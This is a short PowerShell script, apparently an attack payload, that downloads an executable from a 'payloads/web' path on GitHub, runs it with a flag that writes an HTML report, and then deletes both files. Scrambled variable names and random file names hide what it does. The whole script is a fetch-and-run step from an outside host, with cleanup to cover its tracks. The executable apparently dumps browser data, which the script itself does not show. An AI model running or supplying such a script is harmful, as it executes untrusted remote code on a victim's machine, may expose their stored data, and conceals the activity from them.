function uCmLBUkWvE {
    return -join ((65..90) + (97..122) | Get-Random -Count 10 | ForEach-Object {[char]$_})
}
$TcDrgEHOCo = uCmLBUkWvE
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/AlexKollar/Cryptex/master/payloads/web/web.exe' -OutFile "$TcDrgEHOCo.exe"
$zXMpyWDQjY = uCmLBUkWvE
Invoke-Expression "./$TcDrgEHOCo.exe /shtml $zXMpyWDQjY.html"
Start-Sleep 2
Remove-Item "$TcDrgEHOCo.exe"
Remove-Item "$zXMpyWDQjY.html"